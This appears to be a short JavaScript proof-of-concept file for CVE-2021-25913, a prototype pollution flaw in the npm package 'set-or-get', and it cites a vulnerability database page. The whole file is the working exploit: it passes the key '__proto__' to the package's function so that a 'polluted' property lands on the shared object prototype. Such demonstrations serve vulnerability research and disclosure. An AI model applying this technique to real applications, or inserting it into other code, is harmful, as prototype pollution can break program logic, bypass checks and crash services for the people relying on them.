//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25913

 
  var SetOrGet = require("set-or-get");
  obj = {};

   

  SetOrGet(obj, "__proto__", {}).polluted = "yes";
// End of file
